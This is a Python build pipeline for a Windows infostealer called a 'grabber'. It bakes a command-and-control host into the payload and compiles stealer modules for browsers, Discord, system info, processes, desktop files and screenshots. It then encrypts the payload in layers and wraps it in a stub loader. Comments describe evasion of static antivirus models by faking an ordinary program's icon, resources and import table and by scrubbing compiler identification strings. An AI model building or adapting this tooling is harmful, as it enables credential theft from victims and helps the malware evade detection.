#!/usr/bin/env python3
# build_all.py — one-shot grabber pipeline: config → payload → layered crypt → stub
# platform: attacker box, Windows, MinGW-w64 g++ + Python 3.8+ (pycryptodome)
# usage:
#   python build_all.py                          # localhost defaults (127.0.0.1:4444)
#   python build_all.py --host 1.2.3.4 --port 4444
#   python build_all.py --host example.com --port 8443 --path /collect --no-screenshot
#   python build_all.py --list                   # print enabled modules, exit
# output: bin\grabber_<host>_<port>.exe  (self-contained, no runtime deps on victim)
#
# pipeline:
#   1. write payload\c2_config.h          (C2 endpoint baked at compile time)
#   2. gcc  third_party sqlite3 + miniz   (C amalgamations → .o)
#   3. g++  stealer_main.cpp + objects    → build\stealer.exe
#   4. python builder.py                  → build\payload_data.h  (layered encrypted blob)
#   5. g++  stub\stub.cpp + blob          → bin\grabber_<host>_<port>.exe

import argparse
import os
import re
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))          # builder\
ROOT = os.path.dirname(HERE)                               # grabber\
PAYLOAD = os.path.join(ROOT, "payload")
THIRD = os.path.join(PAYLOAD, "third_party")
BUILD = os.path.join(ROOT, "build")
BIN = os.path.join(ROOT, "bin")

MODULES = ["browsers", "discord", "sysinfo", "procs", "desktop", "screenshot"]
MODULE_MACROS = {
    "browsers": "MOD_BROWSERS", "discord": "MOD_DISCORD", "sysinfo": "MOD_SYSINFO",
    "procs": "MOD_PROCS", "desktop": "MOD_DESKTOP", "screenshot": "MOD_SCREENSHOT",
}


def log(tag, msg):
    print(f"[{tag}] {msg}", flush=True)


def run(cmd, step):
    r = subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, encoding="utf-8",
                       errors="replace")
    if r.returncode != 0:
        sys.stderr.write(f"--- {step} FAILED ---\n$ {' '.join(cmd)}\n")
        sys.stderr.write((r.stdout or "") + "\n" + (r.stderr or "") + "\n")
        sys.exit(1)
    return r


def safe_name(s):
    return re.sub(r"[^A-Za-z0-9._-]", "_", s) or "host"


def write_config(host, port, path, modules):
    lines = [
        "#pragma once", "",
        f'#define C2_HOST  L"{host}"',
        f"#define C2_PORT  {port}",
        f'#define C2_PATH  L"{path}"', "",
    ]
    for mod, macro in MODULE_MACROS.items():
        lines.append(f"#define {macro} {1 if mod in modules else 0}")
    lines.append("")
    with open(os.path.join(PAYLOAD, "c2_config.h"), "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    log("cfg", f"C2={host}:{port}{path}  modules={','.join(modules)}")


def compile_c_amalgams():
    objs = []
    c_files = [
        os.path.join(THIRD, "sqlite3.c"),
        os.path.join(THIRD, "miniz.c"),
        os.path.join(THIRD, "miniz_tdef.c"),
        os.path.join(THIRD, "miniz_tinfl.c"),
        os.path.join(THIRD, "miniz_zip.c"),
    ]
    for src in c_files:
        obj = os.path.join(BUILD, os.path.splitext(os.path.basename(src))[0] + ".o")
        # cache: skip when the object is newer than its source (html builder
        # rebuilds hit this path on every click — sqlite3.o alone is the slowest
        # step in the whole pipeline)
        if os.path.exists(obj) and os.path.getmtime(obj) >= os.path.getmtime(src):
            objs.append(obj)
            continue
        run(["gcc", "-O2", "-w", "-c", src, "-o", obj, f"-I{THIRD}"],
            os.path.basename(src))
        objs.append(obj)
    log("c", f"{len(objs)} amalgamation objects ready")
    return objs


def build_payload(objs, modules):
    exe = os.path.join(BUILD, "stealer.exe")
    cmd = [
        "g++", "-O2", "-std=c++17", "-mwindows",
        os.path.join(PAYLOAD, "stealer_main.cpp"),
        f"-I{PAYLOAD}", f"-I{THIRD}",
        *objs,
        "-o", exe,
        "-static",
        "-lwinhttp", "-lbcrypt", "-lcrypt32", "-lws2_32", "-lgdiplus",
        "-lshell32", "-lgdi32", "-ladvapi32", "-lole32", "-luuid", "-luser32",
    ]
    for mod, macro in MODULE_MACROS.items():
        if mod not in modules:
            cmd.insert(2, f"-D{macro}=0")
    run(cmd, "payload")
    log("payload", f"stealer.exe built ({os.path.getsize(exe):,} B)")
    return exe


def encrypt(exe):
    header = os.path.join(BUILD, "payload_data.h")
    run([sys.executable, os.path.join(HERE, "builder.py"), exe, header], "crypter")
    if not os.path.exists(header):
        sys.exit("builder.py did not write payload_data.h")
    log("crypt", f"payload_data.h ({os.path.getsize(header):,} B)")
    return header


def build_stub(header):
    stub_dir = os.path.join(HERE, "stub")
    stub_src = os.path.join(stub_dir, "stub.cpp")
    out = os.path.join(BIN, f"grabber_{safe_name(ARGS.host)}_{ARGS.port}.exe")

    # icon + VERSIONINFO. A PE with neither of them does not read as an
    # application to a static model -- the absence is itself a scored feature --
    # so the icon is regenerated (deterministic) and the .rc compiled fresh.
    run([sys.executable, os.path.join(stub_dir, "make_icon.py")], "icon")
    res = os.path.join(BUILD, "stub_res.o")
    run(["windres", "-O", "coff", "-I", stub_dir,
         os.path.join(stub_dir, "app.rc"), "-o", res], "resource")

    run([
        "g++", "-O2", "-std=c++17", "-mwindows",
        # -s drops the symbol table; -fno-ident drops the .ident our own code
        # emits. -fno-exceptions/-fno-rtti keep the C++ unwind machinery out --
        # paired with the operator new / __throw_length_error we supply in
        # stub.cpp, nothing reaches libstdc++, which is what kept the MCF thread
        # runtime (and its raw Nt* ntdll imports) out of the import table.
        # The compiler ident string itself is scrubbed by _scrub_ident below.
        "-s", "-fno-ident", "-fno-exceptions", "-fno-rtti",
        stub_src, res, f"-I{os.path.dirname(header)}",
        "-o", out, "-static",
        # bcrypt: AES for the crypter layers. user32/gdi32: the desktop queries
        # gui_basics() makes -- they give the import table the shape of an
        # ordinary windowed program rather than crypto wired to VirtualAlloc.
        "-lbcrypt", "-luser32", "-lgdi32",
    ], "stub")
    # PE has no .comment convention, so ld folds the compiler ident into
    # .rdata where objcopy cannot reach it -- blank it in place instead.
    # It is an .ident payload, never referenced by code.
    _scrub_ident(out)
    log("stub", f"{out} ({os.path.getsize(out):,} B)")
    return out


def _scrub_ident(path):
    """Erase toolchain ident strings from the binary.

    Two things get blanked:
      * 'GCC: (MinGW-W64 ...)' -- PE has no .comment section, so ld folds every
        object's .ident into .rdata (33 copies here, ~2.3 KB of a 5.7 KB
        section), each naming the exact toolchain and build.
      * 'Mingw-w64 runtime failure' -- the abort banner from libmingwex's
        SEH helper. One copy, but it spells the compiler out to anything
        matching on strings.

    Nothing reads either at runtime. Printable bytes up to the NUL are replaced
    with spaces, leaving terminators and therefore every section size intact.
    """
    markers = (b"GCC: (", b"Mingw-w64 runtime failure")
    try:
        with open(path, "rb") as f:
            data = bytearray(f.read())

        hits, start = [], 0
        while True:
            i = min([p for p in (data.find(m, start) for m in markers) if p >= 0],
                    default=-1)
            if i < 0:
                break
            hits.append(i)
            start = i + 1

        blanked = 0
        for i in hits:
            j = i
            while j < len(data) and data[j] != 0:
                j += 1
            if j >= len(data):          # unterminated: not ours, leave it
                continue
            if b"mingw" not in data[i:j].lower() and b"gcc" not in data[i:j].lower():
                continue
            data[i:j] = b" " * (j - i)
            blanked += 1

        if blanked:
            with open(path, "r+b") as f:
                f.write(data)
            log("ident", f"scrubbed {blanked} toolchain ident string(s)")
    except Exception:
        pass


def main():
    global ARGS
    ap = argparse.ArgumentParser(description="grabber build pipeline")
    ap.add_argument("--host", default="127.0.0.1", help="C2 host (default: 127.0.0.1)")
    ap.add_argument("--port", type=int, default=4444, help="C2 port (default: 4444)")
    ap.add_argument("--path", default="/collect", help="C2 path (default: /collect)")
    ap.add_argument("--modules", default=",".join(MODULES),
                    help=f"comma list from: {','.join(MODULES)}")
    for m in MODULES:
        ap.add_argument(f"--no-{m}", action="store_true", help=f"disable {m}")
    ap.add_argument("--list", action="store_true", help="list modules and exit")
    ARGS = ap.parse_args()

    if ARGS.list:
        print("\n".join(MODULES))
        return

    if not re.fullmatch(r"[A-Za-z0-9.:\-\[\]]+", ARGS.host):
        sys.exit(f"bad host: {ARGS.host!r} (no quotes/backslashes allowed)")
    if not (0 < ARGS.port < 65536):
        sys.exit(f"bad port: {ARGS.port}")
    if not re.fullmatch(r"/[A-Za-z0-9_\-/]*", ARGS.path):
        sys.exit(f"bad path: {ARGS.path!r}")

    modules = {m.strip() for m in ARGS.modules.split(",") if m.strip()}
    modules &= set(MODULES)
    for m in MODULES:
        if getattr(ARGS, f"no_{m.replace('-', '_')}", False):
            modules.discard(m)
    if not modules:
        sys.exit("no modules enabled")

    os.makedirs(BUILD, exist_ok=True)
    os.makedirs(BIN, exist_ok=True)

    log("step", "1/6 config")
    write_config(ARGS.host, ARGS.port, ARGS.path, modules)
    log("step", "2/6 app-bound hook dll")
    run([sys.executable, os.path.join(BUILD, "mkhook.py")], "hook")
    log("step", "3/6 C amalgamations (sqlite3 + miniz)")
    objs = compile_c_amalgams()
    log("step", "4/6 payload")
    exe = build_payload(objs, modules)
    log("step", "5/6 encryption layers")
    header = encrypt(exe)
    log("step", "6/6 stub loader")
    out = build_stub(header)

    print()
    log("done", out)


if __name__ == "__main__":
    main()
